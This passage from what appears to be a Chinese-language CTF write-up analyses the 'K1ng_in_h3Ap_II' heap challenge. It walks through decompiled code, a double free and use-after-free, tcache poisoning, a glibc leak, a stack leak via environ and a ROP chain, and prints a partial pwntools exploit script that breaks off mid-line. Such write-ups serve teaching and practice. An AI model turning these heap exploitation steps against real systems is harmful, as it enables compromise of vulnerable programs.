%#x&#x27;</span>%(lib_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wp_delete(r, <span class="number">3</span>)</span><br><span class="line">wp_edit(r, <span class="number">3</span>, p64(lib_base + lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">wp_edit(r, <span class="number">3</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xb</span> + p64(lib_base + <span class="number">0x4527a</span>) + p64(lib_base + lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">8</span>))</span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure></p><h1 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h1><p>  <a href="K1ng_in_h3Ap_II.tar.gz">点击下载题目附件</a><br>  这里特别说明一下，目前<strong>ubuntu18</strong>的tcache已经被打上了补丁，即包含了key字段的检测——因此不能仅通过<a href="http://ftp.gnu.org/gnu/glibc/">glibc官网版本源代码</a>去分析(里面少了部分机制)</p><h2 id="题目保护-1"><a href="#题目保护-1" class="headerlink" title="题目保护"></a>题目保护</h2><p>  如下图所示，仍然是保护全开<br>  <img src="K1ng_in_h3Ap_II保护机制.PNG" alt="K1ng_in_h3Ap_II保护机制"></p><h2 id="题目逻辑-1"><a href="#题目逻辑-1" class="headerlink" title="题目逻辑"></a>题目逻辑</h2><p>  和前面的K1ng_in_h3Ap_I是类似的，仍然是一个标准的菜单堆，框架如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  nothing();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        edit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>add</code>功能，类似前面，仍然是添加一个给定输入大小的内存块，逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size:&quot;</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">15</span> || v2 &gt; <span class="number">96</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  chunk[v1] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = size;</span><br><span class="line">  size[v1] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>delete</code>功能，也没怎么改变，就是<code>free</code>掉申请的内存。同样存在未置0导致的<strong>double free</strong>问题，其逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v0 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">0</span> || v0 &gt; <span class="number">15</span> || !chunk[v0] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)chunk[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  最后一个与前面非常相似的，就是<code>edit</code>功能——由于前面<code>delete</code>处的漏洞，这里存在严重的<strong>UAF</strong>问题。函数逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">15</span> || !chunk[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input context:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)chunk[v1], (<span class="type">int</span>)size[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  与前面较大的不同在于，该程序有可控的输出函数——这样配合<strong>UAF</strong>，可以轻松的获取堆地址和glibc基址。函数逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">15</span> || !chunk[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)chunk[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>  一方面，由于此时有可控的输出函数，则配合<strong>UAF</strong>，我们没必要在类似前面修改<strong><em>IO_2_1_stdout</em></strong>来泄露glibc基址——只需要将超过<strong>fast bin</strong>大小的chunk释放到<strong>unsorted bin</strong>中，然后打印即可<br>  另一方面，由于<strong>tcache</strong>可以指向任意位置，而无需检查指向的位置是否为合法的chunk。则通过<strong>environ</strong>变量，我们可以泄露栈地址，并伪造指向当前函数栈的<strong>tcache</strong>链即可，从而输入rop链，通过调用<strong>open</strong>、<strong>read</strong>和<strong>write</strong>系统调用，获取flag</p><h2 id="套路姿势-1"><a href="#套路姿势-1" class="headerlink" title="套路姿势"></a>套路姿势</h2><h3 id="限制大小的tcache下释放chunk至unsorted-bin"><a href="#限制大小的tcache下释放chunk至unsorted-bin" class="headerlink" title="限制大小的tcache下释放chunk至unsorted bin"></a>限制大小的tcache下释放chunk至unsorted bin</h3><p>  首先，由于所有释放的chunk会先释放到<strong>tcache</strong>，等<strong>tcache</strong>填充满(7个)后才释放到<strong>fast bin</strong>或<strong>unsorted bin</strong>中。则我们必须释放8个相同大小的，大小超过fast bin的chunk，才能将chunk释放到<strong>unsorted bin</strong>中；<br>  其次，对于限制大小的tcache来说，就算按照前面释放8个，其第8个及之后的都会被释放至<strong>fast bin</strong>中，不满足要求。</p><p>  可以看到，上述的方法对于释放chunk到<strong>unsorted bin</strong>中都是比较麻烦的，一般更通用的方法是堆重叠。<br>  因为<strong>tcache</strong>也是有范围的，其有64个按照首项是<strong>4 * SIZE_SZ</strong>，公差是<strong>2 * SIZE_SZ</strong>的等差数列分布的范围，即其大小范围通式为<script type="math/tex">2 * SIZE\_SZ * (n + 1), 1 \leq n \leq 64</script>。只要我们申请足够多的连续内存块，然后在这些连续内存块组成的内存区域，伪造一个大小为<strong>2 * SIZE_SZ * 65</strong>(32位为<strong>0x208</strong>，64位为<strong>0x410</strong>)的内存(<em>注意还需要伪造后面的合法内存，否则无法通过释放时的检测</em>)。之后通过写入/覆盖掉<strong>tcache</strong>的<strong>fd</strong>字段，即可将该伪造内存插入到<strong>tcache</strong>链上，然后申请后在释放即可。<br>  一般的内存布局如下所示<br>  <img src="tcache释放chunk至unsorted bin.PNG" alt="tcache释放chunk至unsorted bin"></p><h3 id="获取栈布局"><a href="#获取栈布局" class="headerlink" title="获取栈布局"></a>获取栈布局</h3><p>  由于<strong>tcache</strong>在分布时，不会去检查当前链上的内存是否为合法的bin。因此，只要我们可以控制<strong>tcache</strong>链的指向，我们就可以分配到指向部分的内存——这为我们获取程序的栈分布带来了极大的便利。</p><p>  实际上，通过<code>man execve</code>和<code>man 7 environ</code>，可以看到，glibc中包含有程序的环境变量的指针数组，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       man execve</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The argument vector and environment can be accessed by the called program&#x27;s main function, when it is defined as:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           int main(int argc, char *argv[], char *envp[])</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Note,  however,  that  the  use  of a third argument to the main function is not specified in POSIX.1; according to POSIX.1, the environment should be accessed via the external variable envi‐</span></span><br><span class="line"><span class="comment">       ron(7).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       man 7 environ</span></span><br><span class="line"><span class="comment">       extern char **environ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The  variable environ points to an array of pointers to strings called the &quot;environment&quot;.  The last pointer in this array has the value NULL.  (This variable must be declared in the user pro‐</span></span><br><span class="line"><span class="comment">       gram, but is declared in the header file &lt;unistd.h&gt; if the _GNU_SOURCE feature test macro is defined.)  This array of strings is made available to the process by the exec(3) call that started</span></span><br><span class="line"><span class="comment">       the process.  When a child process is created via fork(2), it inherits a copy of its parent&#x27;s environment.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>  根据计算机基础知识，我们知道环境变量就是<strong>main</strong>的第三个参数，即位于栈上分布。因此，如果我们已经获取了glibc的基址，则我们可以将<strong>tcache</strong>链指向<strong>lib_base + lib.sym[‘environ’]</strong>。然后会获取一个指针数组，其每一个元素都指向栈上某个位置。如果我们打印内存上的数据，也就获取了栈上的相关信息。</p><p>  后面就非常好利用了——如果有了栈信息，则通过栈上存储的返回地址，我们可以轻易的获取代码段地址；有了代码段地址，则我们通过覆写栈上返回地址，可以控制执行流</p><h2 id="题解和关键说明-1"><a href="#题解和关键说明-1" class="headerlink" title="题解和关键说明"></a>题解和关键说明</h2><p>  首先，需要通过前面分析过的堆叠加，从而在大小受限的情况下，将可控的内存释放到<strong>unsorted bin</strong>中，命令如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">wp_add(r, i, <span class="number">0x50</span>)<span class="comment">#base + 0x60 * i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk: base + 0x20</span></span><br><span class="line">wp_delete(r, <span class="number">1</span>)</span><br><span class="line">wp_delete(r, <span class="number">0</span>)</span><br><span class="line">wp_show(r, <span class="number">0</span>)</span><br><span class="line">chunk_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&#x27;chunk_base =&gt; %#x&#x27;</span>%(chunk_base))</span><br><span class="line">wp_edit(r, <span class="number">11</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">wp_edit(r, <span class="number">0</span>, p64(chunk_base + <span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><br>  一方面，在序号为0的内存中构造了fake chunk的chunk头信息；另一方面，在序号为11的内存中完成上下文的构建(<strong>用来释放时绕过检查</strong>)。此时，其内存布局如下所示<br>  <img src="K1ng_in_h3Ap_II内存布局1.PNG" alt="K1ng_in_h3Ap_II内存布局1"></p><p>  此时，我们已经将伪造的非<strong>tcache bin</strong>范围内的内存块插入到<strong>tcache</strong>链中。此时，只需要申请到该内存，然后在释放，则可以将该可控的内存块释放入<strong>unsorted bin</strong>中，相当于我们获取了glibc基址。</p><p>  那么，接下来就非常简单了——我们通过<strong>UAF</strong>，直接将<strong>lib_base + p64(lib.sym[‘environ’])</strong>插入到<strong>tcache</strong>链中，然后打印，即可获取栈的相关位置。</p><p>  在获取栈位置后，通过偏移计算，可以获取指定的栈帧，那么将该栈帧作为<strong>fake chunk</strong>，向该<strong>fake chunk</strong>写入数据，则相当于更改栈帧数据，也就是可以更改函数返回地址，则可以使用rop(这里最好选择edit函数的栈帧——对于其他函数栈帧，其先通过调用edit函数覆盖栈帧，然后再到指定函数被调用过程中，栈帧可能被其他函数栈帧再次覆盖)</p><p>  最后，完整的wp如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">待修改数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span><span class="comment"># 32位使用i386</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">lib_file = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">argv = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf.plt[`symbol`] 获取elf文件中导入符号的plt地址</span></span><br><span class="line"><span class="string">elf.got[`symbol`] 获取elf文件中导入符号的got地址</span></span><br><span class="line"><span class="string">elf.sym[&#x27;symbol&#x27;] 获取elf文件中本地符号的函数实际地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> execve_file != <span class="literal">None</span>:</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lib.sym[`symbol`] 获取lib中符号地址</span></span><br><span class="line"><span class="string">lib.search[&#x27;string&#x27;].next() 获取lib中字符串地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> lib_file != <span class="literal">None</span>:</span><br><span class="line">lib = ELF(lib_file)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">执行爆破攻击</span></span><br><span class="line"><span class="string">只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环</span></span><br><span class="line"><span class="string">否则程序一直进行循环</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_add</span>(<span class="params">r, idx, size</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_delete</span>(<span class="params">r, idx</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_edit</span>(<span class="params">r, idx, context</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input context:\n&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_show</span>(<span class="params">r, idx</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line"><span class="comment">#r = gdb.debug([execve_file] + argv)# 首先加载当前目录下的动态库文件</span></span><br><span class="line">r = process([execve_file] + argv)<span class="comment"># 首先加载当前目录下的动态库文件</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">wp_add(r, i, <span class="number">0x50</span>)<span class="comment">#base + 0x60 * i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk: base + 0x20</span></span><br><span class="line">wp_delete(r, <span class="number">1</span>)</span><br><span class="line">wp_delete(r, <span class="number">0</span>)</span><br><span class="line">wp_show(r, <span class="number">0</span>)</span><br><span class="line">chunk_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&#x27;chunk_base =&gt; %#x&#x27;</span>%(chunk_base))</span><br><span class="line">wp_edit(r, <span class="number">11</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">wp_edit(r, <span class="number">0</span>, p64(chunk_base + <span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get the fake chunk and free</span></span><br><span class="line">wp_add(r, <span class="number">0</span>, <span class="number">0x50</span>)<span class="comment">#base</span></span><br><span class="line">wp_add(r, <span class="number">13</span>, <span class="number">0x50</span>)<span class="comment">#base + 0x20</span></span><br><span class="line">wp_delete(r, <span class="number">13</span>)</span><br><span class="line">wp_show(r, <span class="number">13</span>)</span><br><span class="line">lib_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7fddc0f01ca0</span> + <span class="number">0x7fddc0b16000</span></span><br><span class="line">log.info(<span class="string">&#x27;lib_base =&gt; %#x&#x27;</span>%(lib_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the stack</span></span><br><span class="line">wp_delete(r, <span class="number">3</span>)</span><br><span class="line">wp_delete(r, <span class="number">2</span>)</span><br><span class="line">wp_edit(r, <span class="number">2</span>, p64(lib_base + lib.sym[<span class="string">&#x27;environ&#x27;</span>]))</span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x50</span>)</span><br><span class="line">wp_add(r, <span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">wp_show(r, <span class="number">13</span>)</span><br><span class="line">edit_stack = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7ffcb363c768</span> + <span class="number">0x7ffcb363c640</span></span><br><span class="line">log.info(<span class="string">&#x27;edit_stack =&gt; %#x&#x27;</span>%(edit_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the code</span></span><br><span class="line">wp_delete(r, <span class="number">5</span>)</span><br><span class="line">wp_delete(r, <span class="number">4</span>)</span><br><span 